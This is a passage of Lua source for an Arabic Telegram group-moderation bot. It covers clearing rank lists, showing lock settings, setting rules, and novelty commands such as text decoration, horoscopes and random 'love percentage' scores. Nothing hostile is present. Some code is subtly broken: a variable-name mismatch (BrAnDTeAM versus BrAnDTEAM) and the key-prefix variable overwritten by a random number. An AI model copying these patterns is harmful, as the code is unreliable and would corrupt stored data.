ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المميزين عام")  
DevBrAnD:del(BrAnD..'BrAnD:VipAll:')
end
if txts[2] == 'المدراء العامين' or txts[2] == 'المدراء العام' or txtss[2] == 'المدراء العامين' or txtss[2] == 'المدراء العام' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المدراء العامين")  
DevBrAnD:del(BrAnD..'BrAnD:ManagerAll:')
end
end
if BrAnDConstructor(msg) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المنشئين الاساسيين")  
DevBrAnD:del(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المنشئين")  
DevBrAnD:del(BrAnD..'BrAnD:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المدراء")  
DevBrAnD:del(BrAnD..'BrAnD:Managers:'..msg.chat_id_)
end 
if txts[2] == 'المنظفين' or txtss[2] == 'المنظفين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المنظفين")  
DevBrAnD:del(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_)
end end
if Manager(msg) then
if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف الادمنيه")  
DevBrAnD:del(BrAnD..'BrAnD:Admins:'..msg.chat_id_)
end
end
if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المطايه")  
DevBrAnD:del(BrAnD..'User:Donky:'..msg.chat_id_)
end
if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف رابط المجموعه")  
DevBrAnD:del(BrAnD.."BrAnD:Groups:Links"..msg.chat_id_)
end
if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المميزين")  
DevBrAnD:del(BrAnD..'BrAnD:VipMem:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
DevBrAnD:del(BrAnD..'BrAnD:Muted:'..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المكتومين")  
end
if txts[2] == 'المقيدين' or txtss[2] == 'المقيدين' then     
local list = DevBrAnD:smembers(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevBrAnD:srem(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, v)
end 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المقيدين")  
end
if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف قائمة المنع")  
DevBrAnD:del(BrAnD..'BrAnD:Filters:'..msg.chat_id_)
end
if txts[2] == 'قوائم المنع' or txtss[2] == 'قوائم المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف قوائم المنع")  
DevBrAnD:del(BrAnD..'BrAnD:Filters:'..msg.chat_id_)
DevBrAnD:del(BrAnD.."BrAnD:FilterAnimation"..msg.chat_id_)
DevBrAnD:del(BrAnD.."BrAnD:FilterPhoto"..msg.chat_id_)
DevBrAnD:del(BrAnD.."BrAnD:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'قائمه منع المتحركات' or txtss[2] == 'قائمه منع المتحركات' then     
DevBrAnD:del(BrAnD.."BrAnD:FilterAnimation"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف قائمة منع المتحركات")  
end
if txts[2] == 'قائمه منع الصور' or txtss[2] == 'قائمه منع الصور' then     
DevBrAnD:del(BrAnD.."BrAnD:FilterPhoto"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف قائمة منع الصور")  
end
if txts[2] == 'قائمه منع الملصقات' or txtss[2] == 'قائمه منع الملصقات' then     
DevBrAnD:del(BrAnD.."BrAnD:FilterSteckr"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف قائمة منع الملصقات")  
end
end
end
--     SoUrCe BrAnD     --
if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and text:match("^مسح القوائم$") and ChCheck(msg) then
if not BasicConstructor(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمنشئ الاساسي فقط', 1, 'md')
else
DevBrAnD:del(BrAnD..'BrAnD:Ban:'..msg.chat_id_) DevBrAnD:del(BrAnD..'BrAnD:Admins:'..msg.chat_id_) DevBrAnD:del(BrAnD..'User:Donky:'..msg.chat_id_) DevBrAnD:del(BrAnD..'BrAnD:VipMem:'..msg.chat_id_) DevBrAnD:del(BrAnD..'BrAnD:Filters:'..msg.chat_id_) DevBrAnD:del(BrAnD..'BrAnD:Muted:'..msg.chat_id_)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
end end
--     SoUrCe BrAnD     --
if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
if not BrAnDConstructor(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لمنشئ المجموعه فقط', 1, 'md')
else
local basicconstructor = DevBrAnD:smembers(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_)
local constructor = DevBrAnD:smembers(BrAnD..'BrAnD:Constructor:'..msg.chat_id_)
local Managers = DevBrAnD:smembers(BrAnD..'BrAnD:Managers:'..msg.chat_id_)
local admins = DevBrAnD:smembers(BrAnD..'BrAnD:Admins:'..msg.chat_id_)
local vipmem = DevBrAnD:smembers(BrAnD..'BrAnD:VipMem:'..msg.chat_id_)
local donky = DevBrAnD:smembers(BrAnD..'User:Donky:'..msg.chat_id_)
if #basicconstructor ~= 0 then basicconstructort = 'المنشئين الاساسيين • ' else basicconstructort = '' end
if #constructor ~= 0 then constructort = 'المنشئين • ' else constructort = '' end
if #Managers ~= 0 then Managerst = 'المدراء • ' else Managerst = '' end
if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
DevBrAnD:del(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:Constructor:'..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:Managers:'..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:Admins:'..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:VipMem:'..msg.chat_id_)
DevBrAnD:del(BrAnD..'User:Donky:'..msg.chat_id_)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حذف جميع الرتب التاليه ↫ ❨ "..basicconstructort..''..constructort..''..Managerst..''..adminst..''..vipmemt..''..donkyt.." ❩ بنجاح \n ✓", 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لاتوجد رتب هنا", 1, 'md')
end 
end 
end
--     SoUrCe BrAnD     --
if Admin(msg) then 
if text and text:match("^الاعدادات$") and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Spam:Text'..msg.chat_id_) then
spam_c = 400
else
spam_c = DevBrAnD:get(BrAnD..'BrAnD:Spam:Text'..msg.chat_id_)
end
--     SoUrCe BrAnD     --
if DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     SoUrCe BrAnD     --
if DevBrAnD:get(BrAnD.."BrAnD:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevBrAnD:get(BrAnD.."BrAnD:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevBrAnD:get(BrAnD.."BrAnD:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     SoUrCe BrAnD     --
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevBrAnD:get(BrAnD.."BrAnD:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevBrAnD:hget(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     SoUrCe BrAnD     --
local TXTE = "♰ ⌯ اعدادات المجموعه ↫ ⤈\n⍆═════BR═════⍅\n"
.."♰ ⌯ الروابط ↫ "..mute_links.."\n"
.."♰ ⌯ المعرف ↫ "..lock_tag.."\n"
.."♰ ⌯ البوتات ↫ "..lock_bots.."\n"
.."♰ ⌯ المتحركه ↫ "..mute_gifs.."\n"
.."♰ ⌯ الملصقات ↫ "..lock_sticker.."\n"
.."♰ ⌯ الملفات ↫ "..lock_file.."\n"
.."♰ ⌯ الصور ↫ "..mute_photo.."\n"
.."♰ ⌯ الفيديو ↫ "..mute_video.."\n"
.."♰ ⌯ الاونلاين ↫ "..mute_in.."\n"
.."♰ ⌯ الدردشه ↫ "..mute_text.."\n"
.."♰ ⌯ التوجيه ↫ "..lock_forward.."\n"
.."♰ ⌯ الاغاني ↫ "..mute_music.."\n"
.."♰ ⌯ الصوت ↫ "..mute_voice.."\n"
.."♰ ⌯ الجهات ↫ "..lock_contact.."\n"
.."♰ ⌯ الماركداون ↫ "..markdown.."\n"
.."♰ ⌯ الهاشتاك ↫ "..lock_htag.."\n"
.."♰ ⌯ التعديل ↫ "..mute_edit.."\n"
.."♰ ⌯ التثبيت ↫ "..lock_pin.."\n"
.."♰ ⌯ الاشعارات ↫ "..lock_tgservice.."\n"
.."♰ ⌯ الكلايش ↫ "..lock_spam.."\n"
.."♰ ⌯ الدخول ↫ "..lock_Join.."\n"
.."♰ ⌯ الشبكات ↫ "..lock_wp.."\n"
.."♰ ⌯ المواقع ↫ "..lock_location.."\n"
.."♰ ⌯ الفشار ↫ "..lock_fshar.."\n"
.."♰ ⌯ الكفر ↫ "..lock_kaf.."\n"
.."♰ ⌯ الطائفيه ↫ "..lock_taf.."\n"
.."♰ ⌯ العربيه ↫ "..lock_arabic.."\n"
.."♰ ⌯ الانكليزيه ↫ "..lock_english.."\n"
.."♰ ⌯ الفارسيه ↫ "..lock_farsi.."\n"
.."♰ ⌯ التكرار ↫ "..flood.."\n"
.."♰ ⌯ عدد التكرار ↫ "..Flood_Num.."\n"
.."♰ ⌯ عدد السبام ↫ "..spam_c.."\n"
.."⍆═════BR═════⍅\n♰ ⌯ [SoUrCe ChANnEl](https://t.me/CXRCX)\n"
Dev_BrAnD(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
--     SoUrCe BrAnD     --
if text and text:match("^كول (.*)$") then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_BrAnD(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
--     SoUrCe BrAnD     --
if DevBrAnD:get(BrAnD..'BrAnD:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevBrAnD:del(BrAnD..'BrAnD:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevBrAnD:del(BrAnD..'BrAnD:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevBrAnD:set(BrAnD..'BrAnD:rules'..msg.chat_id_,text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حفظ قوانين المجموعه', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ ارسل لي القوانين الان', 1, 'md')
DevBrAnD:set(BrAnD..'BrAnD:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") then
local rules = DevBrAnD:get(BrAnD..'BrAnD:rules'..msg.chat_id_)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     SoUrCe BrAnD     --
if text == "تفعيل الزخرفه" and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل الزخرفه بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Zrf:BrAnD'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل الزخرفه بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Zrf:BrAnD'..msg.chat_id_,true)  
end
if DevBrAnD:get(BrAnD..'Zrf:BrAnD'..msg.chat_id_..''..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء امر الزخرفه', 1, 'md')
DevBrAnD:del(BrAnD..'Zrf:BrAnD'..msg.chat_id_..''..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiBrAnD.ml/zrf.php?BrAnD='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "♰ ⌯ قائمة الزخرفه ↫ ⤈\n⍆═════BR═════⍅\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, t, 1, 'md')
DevBrAnD:del(BrAnD..'Zrf:BrAnD'..msg.chat_id_..''..msg.sender_user_id_)
return false   
end
if not DevBrAnD:get(BrAnD..'BrAnD:Zrf:BrAnD'..msg.chat_id_) then
if text == 'زخرفه' and SoUrCeCh(msg) or text == 'الزخرفه' and SoUrCeCh(msg) then  
DevBrAnD:setex(BrAnD.."Zrf:BrAnD"..msg.chat_id_..""..msg.sender_user_id_,300,true)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ ارسل لي الكلمه لزخرفتها \nيمكنك الزخرفة باللغه { en } ~ { ar } ', 1, 'md')
end
end
if not DevBrAnD:get(BrAnD..'BrAnD:Zrf:BrAnD'..msg.chat_id_) then
if text and text:match("^زخرفه (.*)$") and SoUrCeCh(msg) or text and text:match("^زخرف (.*)$") and SoUrCeCh(msg) then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiBrAnD.ml/zrf.php?BrAnD='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "♰ ⌯ قائمة الزخرفه ↫ ⤈\n⍆═════BR═════⍅\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
--     SoUrCe BrAnD     --
if text == "تفعيل الابراج" and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل الابراج بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Brg:BrAnD'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل الابراج بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Brg:BrAnD'..msg.chat_id_,true)  
end
if not DevBrAnD:get(BrAnD..'BrAnD:Brg:BrAnD'..msg.chat_id_) then
if text and text:match("^برج (.*)$") and SoUrCeCh(msg) or text and text:match("^برجي (.*)$") and SoUrCeCh(msg) then 
local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
UrlBrg = https.request('https://apiBrAnD.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.BrAnD  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     SoUrCe BrAnD     --
if text and (text == "تفعيل اوامر النسب" or text == "تفعيل نسبه الحب" or text == "تفعيل نسبه الكره" or text == "تفعيل نسبه الرجوله" or text == "تفعيل نسبه الانوثه" or text == "تفعيل نسبه الغباء") and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل اوامر النسب'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Nsba:BrAnD'..msg.chat_id_) 
end
if text and (text == "تعطيل اوامر النسب" or text == "تعطيل نسبه الحب" or text == "تعطيل نسبه الكره" or text == "تعطيل نسبه الرجوله" or text == "تعطيل نسبه الانوثه" or text == "تعطيل نسبه الغباء") and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل اوامر النسب'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Nsba:BrAnD'..msg.chat_id_,true)  
end
if not DevBrAnD:get(BrAnD..'BrAnD:Nsba:BrAnD'..msg.chat_id_) then
if text == "نسبه الحب" and SoUrCeCh(msg) or text == "نسبة الحب" and SoUrCeCh(msg) then
DevBrAnD:set(BrAnD..'LoveNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك وروز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevBrAnD:get(BrAnD..'LoveNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء امر نسبة الحب ', 1, 'md')
DevBrAnD:del(BrAnD..'LoveNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
BrAnD = math.random(0,100);
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ نسبة الحب بين '..text..' هي : '..BrAnD..'%', 1, 'md')
DevBrAnD:del(BrAnD..'LoveNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevBrAnD:get(BrAnD..'BrAnD:Nsba:BrAnD'..msg.chat_id_) then
if text == "نسبه الكره" and SoUrCeCh(msg) or text == "نسبة الكره" and SoUrCeCh(msg) then
DevBrAnD:set(BrAnD..'HataNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك وروز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and DevBrAnD:get(BrAnD..'HataNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء امر نسبة الكره ', 1, 'md')
DevBrAnD:del(BrAnD..'HataNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
BrAnD = math.random(0,100);
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ نسبة الكره بين '..text..' هي : '..BrAnD..'%', 1, 'md')
DevBrAnD:del(BrAnD..'HataNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevBrAnD:get(BrAnD..'BrAnD:Nsba:BrAnD'..msg.chat_id_) then
if text and (text == "نسبه الرجوله" or text == "نسبة الرجوله" or text == "نسبه رجوله" or text == "نسبة رجوله") and SoUrCeCh(msg) then
DevBrAnD:set(BrAnD..'RjolaNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and DevBrAnD:get(BrAnD..'RjolaNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء امر نسبة الرجوله ', 1, 'md')
DevBrAnD:del(BrAnD..'RjolaNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
BrAnD = math.random(0,100);
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ نسبة رجولة '..text..' هي : '..BrAnD..'%', 1, 'md')
DevBrAnD:del(BrAnD..'RjolaNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevBrAnD:get(BrAnD..'BrAnD:Nsba:BrAnD'..msg.chat_id_) then
if text and (text == "نسبه الانوثه" or text == "نسبة الانوثه" or text == "نسبه انوثه" or text == "نسبة انوثه") and SoUrCeCh(msg) then
DevBrAnD:set(BrAnD..'AnothaNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and DevBrAnD:get(BrAnD..'AnothaNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء امر نسبة الانوثه ', 1, 'md')
DevBrAnD:del(BrAnD..'AnothaNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
BrAnD = math.random(0,100);
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ نسبة انوثة '..text..' هي : '..BrAnD..'%', 1, 'md')
DevBrAnD:del(BrAnD..'AnothaNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevBrAnD:get(BrAnD..'BrAnD:Nsba:BrAnD'..msg.chat_id_) then
if text and (text == "نسبه الغباء" or text == "نسبة الغباء") and SoUrCeCh(msg) then
DevBrAnD:set(BrAnD..'StupidNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and DevBrAnD:get(BrAnD..'StupidNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
